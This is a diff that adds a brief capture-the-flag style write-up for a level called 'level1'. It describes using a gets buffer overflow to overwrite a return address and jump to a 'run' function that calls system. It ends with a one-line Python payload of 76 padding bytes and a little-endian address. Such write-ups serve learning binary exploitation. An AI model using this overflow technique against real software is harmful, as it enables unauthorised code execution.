@@ -1,0 +1,9 @@
+## Exploit type: buffer overflow to redirect code exec
+
+with objdump -d -M intel level1  we see run function pas not called by main
+run has call to system, which is syscall to launch command. That should get us
+to next lv. What we have to do is to overwrite return adress of gets in main
+to go to run
+
+
+echo $(python -c 'print 76 * "A" + "\x44\x84\x04\x08"') > /tmp/exploit !! be carefull endianness
